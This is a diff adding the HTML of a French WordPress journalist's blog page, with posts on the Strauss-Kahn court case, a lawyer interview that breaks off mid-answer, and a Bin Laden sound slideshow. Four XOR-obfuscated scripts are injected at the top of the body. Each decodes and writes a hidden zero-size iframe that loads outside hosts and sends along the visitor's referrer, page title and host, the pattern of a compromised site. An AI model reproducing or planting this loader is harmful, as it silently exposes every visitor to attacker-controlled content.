@@ -1,0 +1,502 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="fr-FR"
+ xmlns:og="http://opengraphprotocol.org/schema/"
+ xmlns:fb="http://www.facebook.com/2008/fbml">
+<head profile="http://gmpg.org/xfn/11">
+<title>Edouard de Mareschal</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="description" content="Un site utilisant WordPress" />
+<meta name="generator" content="WordPress 3.6.1" /> <!-- leave this for stats please -->
+<link href="http://blog.edouarddemareschal.com/wp-content/themes/journalist/style.css" rel="stylesheet" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="Edouard de Mareschal RSS Feed" href="http://blog.edouarddemareschal.com/?feed=rss2" />
+<link rel="shortcut icon" type="image/x-icon" href="http://blog.edouarddemareschal.com/wp-content/themes/journalist/favicon.ico" />
+<link rel="pingback" href="http://blog.edouarddemareschal.com/xmlrpc.php" />
+<link rel='stylesheet' id='nextgen_gallery_related_images-css'  href='http://blog.edouarddemareschal.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/nextgen_gallery_display/static/nextgen_gallery_related_images.css?ver=3.6.1' type='text/css' media='all' />
+<script type='text/javascript' src='http://blog.edouarddemareschal.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://blog.edouarddemareschal.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var photocrati_ajax = {"url":"http:\/\/blog.edouarddemareschal.com\/index.php\/photocrati_ajax","wp_site_url":"http:\/\/blog.edouarddemareschal.com\/index.php","wp_site_static_url":"http:\/\/blog.edouarddemareschal.com"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://blog.edouarddemareschal.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ajax/static/ajax.js?ver=3.6.1'></script>
+<script type='text/javascript' src='http://blog.edouarddemareschal.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/frame_communication/static/frame_event_publisher.js?ver=3.6.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.edouarddemareschal.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.edouarddemareschal.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.6.1" />
+<script type="text/javascript" src="http://blog.edouarddemareschal.com/wp-content/plugins/audio-player/assets/audio-player.js?ver=2.0.4.6"></script>
+<script type="text/javascript">AudioPlayer.setup("http://blog.edouarddemareschal.com/wp-content/plugins/audio-player/assets/player.swf?ver=2.0.4.6", {width:"290",animation:"yes",encode:"yes",initialvolume:"60",remaining:"no",noinfo:"no",buffer:"5",checkpolicy:"no",rtl:"no",bg:"E5E5E5",text:"333333",leftbg:"CCCCCC",lefticon:"333333",volslider:"666666",voltrack:"FFFFFF",rightbg:"B4B4B4",rightbghover:"999999",righticon:"333333",righticonhover:"FFFFFF",track:"FFFFFF",loader:"009900",border:"CCCCCC",tracker:"DDDDDD",skip:"666666",pagebg:"FFFFFF",transparentpagebg:"yes"});</script>
+<meta property="og:site_name" content="Edouard de Mareschal" />
+<meta property="og:type" content="article" />
+<!-- <meta name="NextGEN" version="2.0.30" /> -->
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+</head>
+
+<body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<div id="container" class="group">
+
+<h1><a href="http://blog.edouarddemareschal.com/">Edouard de Mareschal</a></h1>
+	<div id="bubble"><p>Un site utilisant WordPress</p></div>
+
+<div id="content">
+
+<div class="post hentry">
+<h2 id="post-810" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=810" rel="bookmark">Je t&rsquo;aime moi non plus</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=810#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D810&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p style="text-align: left;">Webreportage réalisé avec <a href="http://www.doyoubuzz.com/jean-baptiste-gauvin">Jean Baptiste Gauvin</a> et développé par <a href="http://astaseinteractive.com/">Astase Interactive</a>.</p>
+<p style="text-align: left;">Plus d&rsquo;informations très bientôt.</p>
+<p style="text-align: left;">
+<p style="text-align: left;"><a href="http://jetaimemoinonplus.fr/"><img title="Capture d’écran 2012-02-03 à 17.48.36" src="http://edouarddemareschal.com/wp-content/uploads/2012/02/Capture-d%E2%80%99%C3%A9cran-2012-02-03-%C3%A0-17.48.36.png" alt="" width="633" height="577" /></a><a href="http://jetaimemoinonplus.fr/"><br />
+</a></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D810&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2012-02-03T17:58:10">février 3rd, 2012 at 5:58  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a></p>
+    </div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-749" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=749" rel="bookmark">DSK plaide non coupable lors d’une comparution aussi rapide que sur-médiatisée</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=749#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D749&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p><a href="http://www.atlantico.fr/decryptage/dsk-plaide-non-coupable-lors-comparution-aussi-rapide-que-mediatisee-114751.html"><img class="aligncenter size-full wp-image-756" title="Screen shot 2011-06-08 at 3.58.25 AM" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/06/Screen-shot-2011-06-08-at-3.58.25-AM.png" alt="" width="691" height="216" /></a></p>
+<p><strong>Dans une salle d’audience prise d’assaut par les journalistes, DSK a une nouvelle fois clamé son innocence. Ses avocats, comme ceux de l&rsquo;accusation, ont adopté des positions agressives et ne feront aucun compromis.</strong></p>
+<p>En moins de dix minutes, l’affaire était pliée. Sans surprise, Dominique Strauss-Kahn a plaidé non coupable face aux sept chefs d’accusation retenus contre lui. Ses avocats Benjamin Brafman et William Taylor se sont accordés avec la défense sur la date de la prochaine comparution : le 18 juillet, toujours à la Cour Criminelle de Manhattan.  Ils joueront carte sur table, présentant leurs éléments de preuves respectifs.</p>
+<p>L’issue de cette audience était prévisible. Pourtant, elle a attiré un nombre impressionnant de journalistes français, dont les premiers sont arrivés dès cinq heures du matin pour s’assurer une place dans la salle d’audience. La presse américaine arrivera plus tard, sûre de passer en priorité. Une preuve de plus, s’il en fallait une, que l’affaire DSK suscite un engouement médiatique inédit.</p>
+<p>Dominique Strauss-Kahn est apparu moins abattu que lors des précédentes comparutions. En costume cravate bleu marine, le visage fermé, il s’est avancé d’un pas assuré vers le prétoire. Anne Sinclair est arrivée quelques minutes plus tôt, en compagnie de l’une des filles de DSK, ignorant l’assistance de journalistes silencieux.</p>
+<p>Tout va très vite. D’abord l’énoncé des sept chefs d’accusations. Puis, le juge Michael Obus rappelle à Dominique Strauss-Kahn son obligation de se présenter devant le tribunal à toutes les convocations, sous peine de perdre sa liberté sous caution. L’ancien chef du Fonds Monétaire International acquiesce. Depuis la salle d’audience, on entend un groupe de femmes de chambre rassemblées devant le tribunal crier « shame on you ! » (« Honte à vous ! »).  William Taylor se lève. L’avocat de DSK propose une prochaine date d’audience pour échanger avec l’accusation leurs éléments de preuves respectifs. En moins de dix minutes, les termes sont acceptés par le juge qui lève l’audience. En ressortant, DSK lance un regard à sa femme et lui sourit.</p>
+<p>Devant le tribunal, les journalistes du monde entier se pressent pour écouter les déclarations des deux parties. La défense commence avec Benjamin Brafman qui prend la parole : « Nous tenons tout d’abord à remercier toutes les personnes qui ont envoyé des messages de soutien à notre client. Nous ne rentrons pas dans le détail des faits en dehors du tribunal. Mais je suis confiant. Je peux vous prédire qu’il sera relaxé. Il n’y a pas d’éléments forts prouvant une agression ou un acte forcé. »</p>
+<p>Puis vient le tour de la défense. Kenneth Thomson, le nouvel avocat de la victime s’avance vers les micros. Sur un ton ferme, voire cassant, il défend la probité de sa cliente. « Tout l’argent, le pouvoir et l’influence de Dominique Strauss Kahn ne change rien sur ce qu’il a pu faire dans cette chambre d’hôtel. Elle se battra pour sa dignité en tant que femme.  Elle est dévastée, traumatisée par ce que Dominique Strauss-Kahn lui a fait.  C’était une agression sexuelle terrible à l’encontre d’une femme innocente. » Quant aux spéculations sur le retrait éventuel  de son témoignage, il les balaye d’une phrase : « Elle va venir dans ce tribunal. Elle témoignera, et dira au monde entier ce que Dominique Strauss-Kahn lui a fait subir. » Le ton est donné.</p>
+<p>Publié sur <a href="http://www.atlantico.fr/decryptage/dsk-plaide-non-coupable-lors-comparution-aussi-rapide-que-mediatisee-114751.html">Atlantico.fr</a> le 06 Juin 2011.</p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D749&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-06-08T09:06:39">juin 8th, 2011 at 9:06  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=7" title="Voir tous les articles dans publications" rel="category">publications</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=agression-sexuelle" rel="tag">agression sexuelle</a>, <a href="http://blog.edouarddemareschal.com/?tag=arrestation" rel="tag">arrestation</a>, <a href="http://blog.edouarddemareschal.com/?tag=benjamin-brafman" rel="tag">Benjamin Brafman</a>, <a href="http://blog.edouarddemareschal.com/?tag=dominique-srauss-kahn" rel="tag">Dominique Srauss-Kahn</a>, <a href="http://blog.edouarddemareschal.com/?tag=dsk" rel="tag">DSK</a>, <a href="http://blog.edouarddemareschal.com/?tag=engouement-mediatique" rel="tag">engouement médiatique</a>, <a href="http://blog.edouarddemareschal.com/?tag=fmi" rel="tag">FMI</a>, <a href="http://blog.edouarddemareschal.com/?tag=justice" rel="tag">justice</a>, <a href="http://blog.edouarddemareschal.com/?tag=kenneth-thomson" rel="tag">Kenneth Thomson</a>, <a href="http://blog.edouarddemareschal.com/?tag=michael-obus" rel="tag">Michael Obus</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=prochaine-comparution" rel="tag">prochaine comparution</a>, <a href="http://blog.edouarddemareschal.com/?tag=tentative-de-viol" rel="tag">tentative de viol</a>, <a href="http://blog.edouarddemareschal.com/?tag=william-taylor" rel="tag">William Taylor</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-681" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=681" rel="bookmark">Publié sur Libé.fr &#8211; &laquo;&nbsp;Je ne fête jamais la mort de quelqu&rsquo;un. Mais pour Ben Laden, si.&nbsp;&raquo;</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=681#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D681&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p><a href="http://www.liberation.fr/diapo-sonore-mai-2011-mort-ben-laden-new-york.html" target="_blank"><img class="aligncenter size-full wp-image-686" title="Screen shot 2011-05-18 at 3.56.49 PM" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/05/Screen-shot-2011-05-18-at-3.56.49-PM.png" alt="" width="716" height="198" /></a></p>
+<p>A l&rsquo;annonce de la <a href="http://www.lemonde.fr/mort-de-ben-laden/article/2011/05/03/mort-de-ben-laden-1-3-la-traque_1516089_1515627.html" target="_blank">mort d&rsquo;Oussama Ben Laden</a>, des milliers de New Yorkais se sont rassemblés spontanément au Ground Zéro. La plupart d&rsquo;entre eux célébraient ce qu&rsquo;ils considéraient comme la victoire, voire la vengeance des Etats-Unis sur Al-Qaida. Voici le diaporama sonore que j&rsquo;ai réalisé avec Léa Baron, et qui a été <a href="http://www.liberation.fr/diapo-sonore-mai-2011-mort-ben-laden-new-york.html" target="_blank">publié</a> sur Libération.fr.</p>
+<p><object id="soundslider" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="620" height="533" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowScriptAccess" value="always" /><param name="quality" value="high" /><param name="allowFullScreen" value="true" /><param name="menu" value="false" /><param name="bgcolor" value="#000000" /><param name="src" value="http://edouarddemareschal.com/soundslides/WTC/soundslider.swf?size=1&amp;format=xml" /><param name="allowfullscreen" value="true" /><embed id="soundslider" type="application/x-shockwave-flash" width="620" height="533" src="http://edouarddemareschal.com/soundslides/WTC/soundslider.swf?size=1&amp;format=xml" bgcolor="#000000" menu="false" allowfullscreen="true" quality="high" allowscriptaccess="always"></embed></object></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D681&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-05-18T21:56:59">mai 18th, 2011 at 9:56  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=3" title="Voir tous les articles dans diapos sonores" rel="category">diapos sonores</a>,<a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a>,<a href="http://blog.edouarddemareschal.com/?cat=7" title="Voir tous les articles dans publications" rel="category">publications</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=11-septembre" rel="tag">11 septembre</a>, <a href="http://blog.edouarddemareschal.com/?tag=al-qaida" rel="tag">Al-Qaida</a>, <a href="http://blog.edouarddemareschal.com/?tag=ben-laden" rel="tag">Ben Laden</a>, <a href="http://blog.edouarddemareschal.com/?tag=etats-unis" rel="tag">Etats-Unis</a>, <a href="http://blog.edouarddemareschal.com/?tag=ground-zero" rel="tag">Ground Zéro</a>, <a href="http://blog.edouarddemareschal.com/?tag=liberation-fr" rel="tag">Libération.fr</a>, <a href="http://blog.edouarddemareschal.com/?tag=mort" rel="tag">mort</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=terrorisme" rel="tag">terrorisme</a>, <a href="http://blog.edouarddemareschal.com/?tag=twin-towers" rel="tag">twin towers</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-668" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=668" rel="bookmark">DSK en détention provisoire à New York, avant son passage devant le Grand Jury d&rsquo;ici à vendredi</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=668#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D668&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p style="text-align: center;">
+<div id="attachment_679" class="wp-caption aligncenter" style="width: 720px"><img class="size-full wp-image-679" title="Matthew J.Galluzzo, avocat pénaliste à New York./ Photo Edouard de Mareschal" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/05/DSC0004-photo-web-ok2.jpg" alt="" width="710" height="475" /><p class="wp-caption-text">Matthew J.Galluzzo, avocat pénaliste à New York./ Photo Edouard de Mareschal</p></div>
+<p><a href="http://newyorkcriminaldefenseblawg.com/" target="_blank">Matthew J.Galluzzo</a>, avocat pénaliste à New York, a suivi la comparution de Dominique Strauss-Kahn cet après-midi devant la Cour Criminelle de Manhattan. Pour la <a href="http://www.nyfp.tv" target="_blank">NYFP</a>, il explique les suites pénales qui seront données à « l’affaire DSK ».</p>
+<p><strong>New York Financial Press : Pourquoi la demande de libération sous caution de DSK a-t-elle été refusée par la juge ?</strong></p>
+<p><strong>Matthew J.Galluzzo :</strong> La question était de savoir si Dominique Strauss-Kahn n’allait pas tenter de se soustraire à la justice américaine. La défense avait proposé un million de dollar de caution. Le prévenu serait resté dans l’appartement de sa fille à New York, sans passeport et avec un bracelet électronique. Mais la juge a suivi le procureur qui pense que DSK a tenté de fuir le pays à bord de l’avion où il a été arrêté, en partance pour la France.  Il a affirmé avoir visionné le départ précipité de DSK, filmé par la vidéosurveillance de son hôtel.</p>
+<p><strong>Ou est-il écroué en ce moment ?</strong></p>
+<p>Généralement, les détentions préventives se font à la prison de Rikers Island, dans le Queens à New York. Mais il peut également être écroué au Manhattan Detention Complex, à quelques blocks du tribunal.</p>
+<p><strong>Qu’est ce qui attend DSK maintenant ?</strong></p>
+<p>La prochaine étape, ce sera son passage devant le Grand Jury d’ici à vendredi. Pour l’instant, nous n’avons qu’un acte d’accusation préliminaire, avec les charges retenues par l’accusation. C&rsquo;est le Grand Jury, composé de 23 citoyens de Manhattan, qui décidera si les preuves sont assez solides pour que le procès ait lieu. Le cas échéant, la défense et l&rsquo;accusation constitueront leurs dossiers. Puis le procureur aura 90 jours pour ouvrir le procès. Le vrai procès, le « trial », ne s’ouvrira donc pas avant plusieurs mois.</p>
+<p><strong>C’est à dire ?</strong></p>
+<p>Dans le meilleur des cas, il pourrait s’ouvrir dans quatre à six mois. Mais cela peut aller jusqu’à un an.</p>
+<p><strong>Quelle peine encourt-il ?</strong></p>
+<p>Plusieurs charges sont retenues contre lui. Il a été inculpé pour agression sexuelle, tentative de viol et séquestration. Mais l’accusation la plus grave reste « acte sexuel criminel au premier degré ».  Il est donc accusé de viol par fellation ou sodomie, avec recours ou menace de recours à la force. Rien que pour cela, il est passible de 25 ans de réclusion.</p>
+<p><strong>25 ans de prison, plus les peines qui correspondent aux autres chefs d’accusation ?</strong></p>
+<p>C’est vrai qu’en droit pénal américain, les peines sont cumulatives. Mais dans ce cas précis, tous les chefs d’accusation ne renvoient qu&rsquo;à un seul et même fait. Il est donc possible que le tribunal ne retienne que la charge la plus lourde. Mais le procureur a également annoncé qu’il pourrait y avoir d’autres charges retenues contre DSK, pour des faits distincts. Le cas échéant, les peines seront cumulatives.</p>
+<p><strong>La police de New York a choisi d’exposer DSK menotté devant la presse. Comprenez que certaines personnes aient été choquées en France ?</strong></p>
+<p>Oui, je comprends tout à fait. Mais il faut savoir que c’est courant ici. Les photographes ont le droit de faire leur travail. Pourtant, cela peut être considéré comme une atteinte à la présomption d’innocence. Moi-même, je n’aime pas tellement cette pratique.</p>
+<p><strong>N’y a-t-il pas un risque d’influencer le jury en le montrant dans cette position ?</strong></p>
